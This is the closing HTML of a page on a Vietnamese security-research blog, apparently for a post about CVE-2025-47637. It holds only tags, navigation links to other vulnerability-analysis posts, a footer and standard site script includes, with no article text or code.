    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/arbitrary-file-upload/" class="post-tag" title="Nhãn - Arbitrary File Upload">Arbitrary File Upload</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-11-11-pop-chain-lab1/" class="post-nav-item" rel="prev" title="POP Chain Analysis &amp; Exploit"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>POP Chain Analysis &amp; Exploit</a><a href="/vi/posts/2025-11-12-cve-2025-32202/" class="post-nav-item" rel="next" title="CVE-2025-32202 Analysis &amp; POC">CVE-2025-32202 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/posts/2025-11-11-cve-2025-47637/config/page.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
